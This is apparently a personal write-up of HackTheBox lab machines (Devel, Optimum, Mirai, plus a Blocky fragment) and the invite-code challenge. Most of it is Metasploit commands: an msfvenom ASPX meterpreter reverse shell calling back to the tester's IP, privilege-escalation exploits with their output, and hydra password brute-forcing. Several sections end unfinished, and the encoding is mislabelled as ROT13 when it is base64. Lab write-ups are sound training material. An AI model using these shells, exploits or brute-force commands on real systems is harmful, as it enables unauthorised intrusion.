*HackTheBox*narrative

Registration
    The first challenge is to register on the site.
    The registration page is https://www.hackthebox.eu/en/invite where there is a form to submit an invite code.
    In the landing page code, we can see and interesting JS library loaded: https://www.hackthebox.eu/js/inviteapi.min.js. The code is obfuscated, we can use any online beautifier and it unpacks to the following code:
    *function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}*

    We can easily identify the function makeInviteCode() that talks to the REST endpoint */api/invite/how/to/generate*. Making a post request to https://www.hackthebox.eu/api/invite/how/to/generate returns the following response:
    *$ curl -X POST https://www.hackthebox.eu/api/invite/how/to/generate
{"success":1,"data":{"data":"SW4gb3JkZXIgdG8gZ2VuZXJhdGUgdGhlIGludml0ZSBjb2RlLCBtYWtlIGEgUE9TVCByZXF1ZXN0IHRvIC9hcGkvaW52aXRlL2dlbmVyYXRl","enctype":"BASE64"},"0":200}*

    It appears that the data object has been encrypted using ROT13. We can decrypt it at rot13.com, and we get the following message:

    In order to generate the invite code, make a POST request to /api/invite/generate

    *$ curl -X POST https://www.hackthebox.eu/api/invite/generate
{"success":1,"data":{"code":"T01KUlYtWE1LQU4tWkNHQVYtV0dJRkctTkRWSFA=","format":"encoded"},"0":200}*

    The code object shown abobe base64 decodes to *OMJRV-XMKAN-ZCGAV-WGIFG-NDVHP* which we can use as an invite code to register.

Devel 10.10.10.5
    Reconnaissance: Quick syn port scan.
        *$ nmap -T5 -sS 10.10.10.
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http*
    Find services behind the previous ports:
        *nmap -A 10.10.10.5 -p 21,80
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 08-22-17  10:02PM                 1577 asd.aspx
| 08-22-17  10:09PM                45395 asd.exe
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7*

    Vulnerability scanning: The FTP server appears to allow anonymous connections, we can connect into it and see if we are lucky and we have write premissions.
        *$ ftp 10.10.10.5
> anonymous
> anonymous
> put /tmp/test test
226 Transfer complete.
744 bytes sent in 0.00 secs (334.0517 kB/s)*
    Amazing, we can upload arbitrary files. Let's take a look now at the web server. If we run the dir command, we can see the file welcome.png, this is the file used in the index of the IIS server. Would it be possible to upload a file, and get it served through the web server? We try to fetch *http://10.10.10.5/test* and as suspected, we can have arbitrary files uploaded and interpreted by IIS.

    We can try to upload an ASPX reverse shell, and see if IIS will execute it and give us access to the machine. We can create a meterpreter reverse shell as:
    *$msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.120 LPORT=1234 -f aspx > shell.aspx*

    We listen for incoming connections using:
    *$ msfconsole
> use exploit/multi/handler
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 10.10.14.120
> set LPORT 1234
> run*
    We upload the shell and request it in the web server *http://10.10.10.5/shell.aspx* and we get a connection in our meterpreter.

    Elevation of privileges: First, we find out our current user.
    *> getuid
Server username: IIS APPPOOL\Web*
    We can try to get SYSTEM by using common techniques, but as expected is fails:
    *> getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)*
    Next step is find out about the operating system:
    *> sysinfo
Computer        : DEVEL
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows*
    No idea about what exploit to use, we can use the following post exploitation script to get more hints:
    *> background
> use post/multi/recon/local_exploit_suggester
> sessions -l
> set SESSION 1
> run
[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 37 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.*

    We should go through all of them and see if any work. Lets try exploit/windows/local/ms10_015_kitrap0d:
        *> use exploit/windows/local/ms10_015_kitrap0d
msf exploit(ms10_015_kitrap0d) > set session 1
msf exploit(ms10_015_kitrap0d) > set lport 12345
msf exploit(ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.120:12345
[*] Launching notepad to host the exploit...
[+] Process 3008 launched.
[*] Reflectively injecting the exploit DLL into 3008...
[*] Injecting exploit into 3008 ...
[*] Exploit injected. Injecting payload into 3008...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (956991 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.120:12345 -> 10.10.10.5:49195) at 2017-08-19 15:06:55 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > cat ../../../Users/Administrator/Desktop/root.txt.txt
e621a0b5041708797c4fc4728bc72b4b*

Optimum 10.10.10.8
    Reconnaissance: Same methodology as carried out in previous machines, quick syn port scan:
    *root@kali:~# nmap -T5 -sS 10.10.10.8

Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-19 15:15 BST
Nmap scan report for 10.10.10.8
Host is up (0.030s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http*
    Service identification:
    *# nmap -A 10.10.10.8 -p 80

Starting Nmap 7.50 ( https://nmap.org ) at 2017-08-19 15:17 BST
Nmap scan report for 10.10.10.8
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /*

    Vulnerability scanning: We run msfconsole and search if HttpFileServer 2.3 has any exploit.
    *$ msfconsole
    > search httpfileserver
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                   Disclosure Date  Rank       Description
   ----                                   ---------------  ----       -----------
   exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Rejetto HttpFileServer Remote Command Execution*

    It is our lucky day:
    *msf > use exploit/windows/http/rejetto_hfs_exec
msf exploit(rejetto_hfs_exec) > info

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  RHOST                       yes       The target address

msf exploit(rejetto_hfs_exec) > set rhost 10.10.10.8
rhost => 10.10.10.8
msf exploit(rejetto_hfs_exec) > set lhost 10.10.14.120
lhost => 10.10.14.120
msf exploit(rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.10.14.120:4444
[*] Using URL: http://0.0.0.0:8080/x2ubxl8
[*] Local IP: http://192.168.0.10:8080/x2ubxl8
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /x2ubxl8
[*] Sending stage (956991 bytes) to 10.10.10.8
[*] Meterpreter session 1 opened (10.10.14.120:4444 -> 10.10.10.8:49669) at 2017-08-19 15:22:06 +0100
[!] Tried to delete %TEMP%\KAlUhROlo.vbs, unknown result
[*] Server stopped.

meterpreter > getuid
Server username: OPTIMUM\kostas*
    We got ourselves access to kostas, the user that was running HttpFileServer.

    Privilege escalation: As in previous machines, try to use the out of the box privielege escalation of meterpreter.
    *meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)*
    We can get information about the operating system and architecture:
    *meterpreter > sysinfo
Computer        : OPTIMUM
OS              : Windows 2012 R2 (Build 9600).
Architecture    : x64
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows*

    Next step is to elevate privileges to SYSTEM. We put the current session at background.
    *meterpreter > background
[*] Backgrounding session 1...
msf exploit(rejetto_hfs_exec) > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > sessions -l

Active sessions
===============

  Id  Type                     Information               Connection
  --  ----                     -----------               ----------
  1   meterpreter x86/windows  OPTIMUM\kostas @ OPTIMUM  10.10.14.120:4444 -> 10.10.10.8:49669 (10.10.10.8)

msf post(local_exploit_suggester) > set session 1
session => 1
msf post(local_exploit_suggester) > run
[*] 10.10.10.8 - Collecting local exploits for x86/windows...
[*] 10.10.10.8 - 37 exploit checks are being tried...
[+] 10.10.10.8 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.8 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.8 - exploit/windows/local/ms_ndproxy: The target service is running, but could not be validated.
[*] Post module execution completed
*

    The trick is that the system is an x64 so the normal reverse shell won't work, we need to set the payload to the following one:
    *msf exploit(ms_ndproxy) > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf exploit(ms16_032_secondary_logon_handle_privesc) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(ms16_032_secondary_logon_handle_privesc) > set session 1
session => 1
msf exploit(ms16_032_secondary_logon_handle_privesc) > run

[*] Started reverse TCP handler on 192.168.0.10:4444
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\Desktop\FPefGWkGRxzZ.txt...
[*] Compressing script contents...
[+] Compressed size: 3596
[*] Executing exploit script...*


Mirai 10.10.10.48
    Reconnaissance. We apply our methodology, first quick syn port scan:
    *root@kali:~# sudo nmap -vv -T5 -sS 10.10.10.48
Host is up, received echo-reply ttl 63 (0.037s latency).
Scanned at 2017-09-03 08:53:09 BST for 2s
Not shown: 997 closed ports
Reason: 997 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
53/tcp open  domain  syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63*

    There is a SSH, DNS and HTTP services, next step is to fingerprint them:
    *# nmap -A 10.10.10.48 -p 22,53,80
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey:
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid:
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).*

    Let's try to see what the web server is serving:
    *# nc -vvv 10.10.10.48 80
10.10.10.48: inverse host lookup failed: Unknown host
(UNKNOWN) [10.10.10.48] 80 (http) open
GET / HTTP/1.0
Connection close

HTTP/1.1 404 Not Found
X-Pi-hole: A black hole for Internet advertisements.
Content-type: text/html; charset=UTF-8
Content-Length: 0
Connection: close
Date: Sun, 03 Sep 2017 08:33:08 GMT
Server: lighttpd/1.4.35*

    We immediately spot the non standard X-Pi-hole header, which points out that the server is likely running the service Pi Hole, which drops DNS requests of known advertisement sites.
    We an look now at the DNS server.

    *root@kali:~# dig @10.10.10.48 google.com

; <<>> DiG 9.10.3-P4-Debian <<>> @10.10.10.48 google.com
; (1 server found)
;; global options: +cmd
;; connection timed out; no servers could be reached*

    Same problem, the server does not respond. The SSH server is the only one we can successfully connect:

    *# ssh 10.10.10.48
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
root@10.10.10.48's password: *

    Vulnerability Scanning. First, we look for low hanging fruit, we look for know vulnerabilities of: *dnsmasq-2.76*, *lighttpd/1.4.35*, and *OpenSSH6.7p1*.
    In Kali linux, we can do:
    *$ msfconsole
> search lighttpd*
    And also:
    *$ searchsploit lighthttp*
    Unfortunately, we don't find any exploit. Since we might have to spend some time to find an exploitation mechanism, we run a password bruteforce attack on background, in case we get an easy win:

    *$ hydra -l root -P  /usr/share/wordlists/metasploit/password.lst 10.10.10.48 ssh*

    Let's focus known on the applications, Pi Hole. The official page for documentation is *https://pi-hole.net/*. We quickly spot that the admin page is available at */admin*. Making a request to it serves an admin panel. There is a login form, but it appears that there are no default credentials and that the password has to be set at setup time. We can run a bruteforce attack anyway:
    *$ hydra -l foo -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.10.10.48 http-post-form "/admin/index.php?login:pw=^PASS^&^USER^:wrong"*

    On the main page, the product version is displayed, we can search if it is up to date:
    * Pi-hole Version v3.1.4 Web Interface Version v3.1 FTL Version v2.10
Donate if you found this useful.*
    On github, we can see it is the very last release at the time of doing the write up https://github.com/pi-hole/pi-hole/releases. So it is the web interface.


    Blocky 10.10.10.37
        The machine runs an HTTP server. It has Phpmyadmin and wordpress.
        *dirb http://10.10.10.37/phpmyadmnin/ /usr/share/dirb/wordlists/common.txt
        root@kali:/usr/share/wordlists/metasploit# whatweb 10.10.10.20
            http://10.10.10.20 [200 OK] Apache[2.4.7], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], IP[10.10.10.20], Title[Under Development!]*